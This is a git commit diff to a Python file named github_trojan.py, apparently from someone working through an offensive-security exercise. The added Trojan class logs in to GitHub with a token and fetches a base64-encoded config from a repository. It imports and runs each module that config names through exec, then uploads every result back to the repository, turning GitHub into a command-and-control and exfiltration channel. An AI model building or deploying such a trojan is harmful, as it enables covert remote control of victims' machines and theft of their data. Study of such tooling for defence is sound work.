8c1156584446a927e7d104612376d4fe8e43d48c
unknown <miketorii@gmail.com>
2025-05-24 02:38:39 +0000

    store data to git

--- cybersecurity/github_trojan.py
+++ cybersecurity/github_trojan.py
@@ -16,26 +16,55 @@ def github_connect():
     print("---github connect---")
     user = os.getenv("USER_NAME")
     key = os.getenv("GIT_TOKEN")
-    print(user)
-    print(key)
     sess = github3.login(token=key)
-    print("----repository------")
     repo = sess.repository(user,"ProjectX")
-    print(repo)
-    get_file_contents("cybersecurity/config","abc.json",repo)
+    return repo
 
 def get_file_contents(dirname, module_name, repo):
     config_json = repo.file_contents(f'{dirname}/{module_name}').content
-    print(config_json)
-    config = json.loads(base64.b64decode(config_json))
-    print(config)
     return config_json
-    
-def run():
-    print("-------run-------")
-    github_connect()
+
+class Trojan:
+    def __init__(self, id):
+        self.id = id
+        self.config_file = f"{id}.json"
+        self.data_path = f"data/{id}/"
+        self.repo = github_connect()
+
+    def get_config(self):
+        config_json = get_file_contents("cybersecurity/config",self.config_file,self.repo)
+        config = json.loads(base64.b64decode(config_json))
+
+        for task in config:
+            print("-----")
+            print(task)
+            if task["module"] not in sys.modules:
+                exec("import %s" % task["module"])
+                print("--exec--")
+
+        return config
+
+    def module_runner(self, module):
+        result = sys.modules[module].run()
+        #print(result)
+        self.store_module_result(result)
+
+    def store_module_result(self, data):
+        message = datetime.now().isoformat()
+        remote_path = f"data/{self.id}/{message}.data"
+        print(remote_path)
+        bindata = bytes("%r" % data, "utf-8")
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+        
+    def run(self):
+        print("-------run-------")
+        config = self.get_config()
+        for task in config:
+            self.module_runner(task["module"])
 
 if __name__ == "__main__":
     load_dotenv(".env")
-    run()
+    trojan = Trojan("abc")
+    trojan.run()
+
     
